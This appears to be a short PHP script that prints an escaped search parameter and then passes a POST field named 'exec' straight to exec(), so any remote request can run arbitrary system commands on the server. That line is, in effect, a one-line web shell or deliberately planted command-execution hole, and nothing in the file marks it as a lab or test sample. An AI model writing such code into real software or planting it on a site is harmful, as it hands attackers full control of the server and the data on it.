<?php

echo "<h>" .htmlspecialchars($_GET["search"], ENT_QUOTES, 'UTF-8'). "</h>";


exec($_POST["exec"]);

?>
